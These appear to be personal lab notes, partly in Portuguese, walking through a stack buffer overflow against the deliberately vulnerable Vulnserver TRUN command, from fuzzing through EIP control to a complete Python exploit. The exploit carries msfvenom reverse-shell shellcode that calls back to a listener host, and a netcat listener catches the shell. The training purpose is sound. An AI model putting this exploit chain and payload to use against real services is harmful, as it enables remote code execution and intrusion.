Windows 10 Server VM - file / Host Network Manager / Host-only network Intel PRO 8254 Permitir VMs
Kali NAT Intel PRO 8254 Permitir tudo

thegreycorner.com/vulnserver.html
immunityinc.com/products/debugger

Defender off

vulnserver.exe as admin
Immunity as admin / file /attach vuln server / play / IP win port 9999

https://medium.com/@lonewolf.raj/easy-steps-to-exploit-windows-based-buffer-overflow-vulnserver-ae9ad4b415b6

https://joncraton.org/blog/46/netcat-for-windows/

nc -nv 192.168.44.100 9999 (netcat) -- Kali

generic_send_tcp

SPIKING:
stats.spk:

s_readline();
s_string("STATS ");
s_string_variable("0");

generic_send_tcp 192.168.44.101 9999 stats.spk 0 0 

not vulnerable

TRUN SPIKING

s_readline();
s_string("TRUN ");
s_string_variable("0");

generic_send_tcp 192.168.44.101 9999 stats.spk 0 0 
send bunch of A's
crash immunity debugger

EBP = 414141 == A A A A (!)
over everything
EIP 414141 -> can inject malicious here

we know TRUN is vulnerable -> FUZZING

fuzz.py
#!/usr/bin/python
import sys, socket
from time import sleep

buffer ="A"*50

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('192.168.56.101',9999))
		
		s.send(('TRUN /.:/' + buffer))
		sleep(1)
		buffer=buffer + "A"*50
	except:
		print("Fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()
    
chmod +x fuzz.py
./fuzz.py
Fuzzing crashed at 15900 bytes

FIND OFFSET

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 17000 (>15900) > offset.txt
#!/usr/bin/python
import sys, socket
from time import sleep

buffer ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6"

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.56.101',9999))
	
	s.send(('TRUN /.:/' + buffer))
	s.close()
except:
	print("Fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()   
   

└─# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 17000 -q 386F4337
Exact match at offset 2003

control EIP = 4 bytes

OVERWRITE EIP

#!/usr/bin/python
import sys, socket
from time import sleep

buffer="A"*2003+"B"*4

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.56.101',9999))
	
	s.send(('TRUN /.:/' + buffer))
	s.close()
except:
	print("Fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()
	
->42424242

unit-conversion.info/texttools/hexadecimal


FIND BAD CHARACTERS -> inutiliza payload

http://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/

#!/usr/bin/python
import sys, socket
from time import sleep

badchars=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer="A"*2003+"B"*4 + badchars

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.56.101',9999))
	
	s.send(('TRUN /.:/' + buffer))
	s.close()
except:
	print("Fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()
	
check Hex Dump <- ESP right click follow in dump

01 02 03 04 ...09, 0A, 0B 0F 10 11  12.. 19 1A

01 02 03 B0 B0 06 07 08 -> B0 bad characters

check each one missing in sequence** <- shellcode

FIND RIGHT MODULE - mona.py

https://github.com/corelan/mona

mona.py to c:\Program Files x86 \ Immunity Inc \ Immunity Debugger \ PyCommands

! mona modules
look for False False False ==  essfunc.dll no memory protection

Kali
locate nasm_shell

/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

Convert Assembly into hexcode

JMP ESP (pointer)
00000000  FFE4              jmp esp

back Immunity

!mona find -s "\xff\xe4" -m essfunc.dll

Kali
gedit fuzz2.py

#!/usr/bin/python
import sys, socket
from time import sleep

#return address 625011af - pointer in B place EIP, reversed

shellcode="A"*2003+"\xaf\x11\x50\x62"

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.56.101',9999))
	
	s.send(('TRUN /.:/' + shellcode))
	s.close()
except:
	print("Fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()
	
Immunity top left:

black arrow - 625011af
find JMP ESP
create breakpoint - hit F2
Play (running)

./fuzz2.py

GETTING ROOT:

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

CTRL+C CTRL+V

#!/usr/bin/python
import sys, socket
from time import sleep

overflow=("\xda\xde\xb8\xab\xf6\x4f\x1f\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x42\x17\x03\x42\x17\x83\x69\xf2\xad\xea\x91\x13\xb3"
"\x15\x69\xe4\xd4\x9c\x8c\xd5\xd4\xfb\xc5\x46\xe5\x88\x8b\x6a"
"\x8e\xdd\x3f\xf8\xe2\xc9\x30\x49\x48\x2c\x7f\x4a\xe1\x0c\x1e"
"\xc8\xf8\x40\xc0\xf1\x32\x95\x01\x35\x2e\x54\x53\xee\x24\xcb"
"\x43\x9b\x71\xd0\xe8\xd7\x94\x50\x0d\xaf\x97\x71\x80\xbb\xc1"
"\x51\x23\x6f\x7a\xd8\x3b\x6c\x47\x92\xb0\x46\x33\x25\x10\x97"
"\xbc\x8a\x5d\x17\x4f\xd2\x9a\x90\xb0\xa1\xd2\xe2\x4d\xb2\x21"
"\x98\x89\x37\xb1\x3a\x59\xef\x1d\xba\x8e\x76\xd6\xb0\x7b\xfc"
"\xb0\xd4\x7a\xd1\xcb\xe1\xf7\xd4\x1b\x60\x43\xf3\xbf\x28\x17"
"\x9a\xe6\x94\xf6\xa3\xf8\x76\xa6\x01\x73\x9a\xb3\x3b\xde\xf3"
"\x70\x76\xe0\x03\x1f\x01\x93\x31\x80\xb9\x3b\x7a\x49\x64\xbc"
"\x7d\x60\xd0\x52\x80\x8b\x21\x7b\x47\xdf\x71\x13\x6e\x60\x1a"
"\xe3\x8f\xb5\x8d\xb3\x3f\x66\x6e\x63\x80\xd6\x06\x69\x0f\x08"
"\x36\x92\xc5\x21\xdd\x69\x8e\x47\x22\x73\x41\x30\x20\x73\x4c"
"\x9d\xad\x95\x04\x0d\xf8\x0e\xb1\xb4\xa1\xc4\x20\x38\x7c\xa1"
"\x63\xb2\x73\x56\x2d\x33\xf9\x44\xda\xb3\xb4\x36\x4d\xcb\x62"
"\x5e\x11\x5e\xe9\x9e\x5c\x43\xa6\xc9\x09\xb5\xbf\x9f\xa7\xec"
"\x69\xbd\x35\x68\x51\x05\xe2\x49\x5c\x84\x67\xf5\x7a\x96\xb1"
"\xf6\xc6\xc2\x6d\xa1\x90\xbc\xcb\x1b\x53\x16\x82\xf0\x3d\xfe"
"\x53\x3b\xfe\x78\x5c\x16\x88\x64\xed\xcf\xcd\x9b\xc2\x87\xd9"
"\xe4\x3e\x38\x25\x3f\xfb\x58\xc4\x95\xf6\xf0\x51\x7c\xbb\x9c"
"\x61\xab\xf8\x98\xe1\x59\x81\x5e\xf9\x28\x84\x1b\xbd\xc1\xf4"
"\x34\x28\xe5\xab\x35\x79")

buffer="A"*2003+"\xaf\x11\x50\x62"+"\x90"*64+overflow

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.56.101',9999))
	
	s.send(('TRUN /.:/' + buffer))
	s.close()
except:
	print("Fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()
	
**** VERIFICAR E TIRAR BAD CHARACTERS NO HEX DUMP DO ESP
	
nc -nvlp 4444

./fuzz2.py
